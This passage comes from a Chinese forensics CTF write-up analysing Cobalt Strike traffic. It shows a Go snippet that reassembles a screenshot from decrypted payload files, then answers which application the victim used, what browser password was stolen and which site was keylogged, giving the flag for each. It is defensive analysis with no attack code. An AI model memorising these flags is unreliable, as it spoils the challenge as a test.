	var buf bytes.Buffer
	for filename := range filenameGen() {
		content, err := os.ReadFile(filename)
		if err != nil {
			panic(err)
		}
		_, err = buf.Write(content[3*16-3:])
		if err != nil {
			panic(err)
		}
	}
	err := os.WriteFile("res.png", buf.Bytes(), 0644)
	if err != nil {
		panic(err)
	}
}
```

![[CobaltStrike流量分析-260207-235326.png]]

```flag8
flag{Hacker}
```

## 9 步骤九 - 截图时使用的软件

> [!info]
> 9. 黑客截图后获取到用户正在使用哪个软件？（提交程序名称如 firefox）

### 9.1 方法一：溯源日志

如下图，日志中直接记录了用的是 `chrome`

![[CobaltStrike流量分析-260208-001014.png]]

### 9.2 方法二：解析流量

如下图，执行截图命令的 `CALLBACK` 的 `md5` 用蓝色标记了，去找到对应的载荷改一下后缀即可看到图片内容。

![[CobaltStrike流量分析-260208-001313.png]]

![[CobaltStrike流量分析-260208-001347.png]]

```flag9
flag{chrome}
```

## 10 步骤十 - 浏览器保存的密码

> [!info]
> 10. 黑客读取到浏览器保存的密码是什么？

### 10.1 方法一：溯源日志

如下图，使用工具获取了两次浏览器密码，第二次成功了

![[CobaltStrike流量分析-260208-001844.png]]

![[CobaltStrike流量分析-260208-001918.png]]

### 10.2 方法二：解析流量

在解析的流量中也同样找到了获取到的浏览器密码

![[CobaltStrike流量分析-260208-002059.png]]

```flag10
flag{0f338a1a6ad8785cee2b471d9d3e9f91}
```

## 11 步骤十一 - 键盘记录打开的网站

> [!info]
> 11. 黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）

### 11.1 方法一：溯源日志

从日志中找到，是打开了玄机

![[CobaltStrike流量分析-260208-002235.png]]

### 11.2 方法二：解析流量

从解析的流量中也同样能找到同样的结果

![[CobaltStrike流量分析-260208-002402.png]]

```flag11
flag{xj.edisec.net}
```
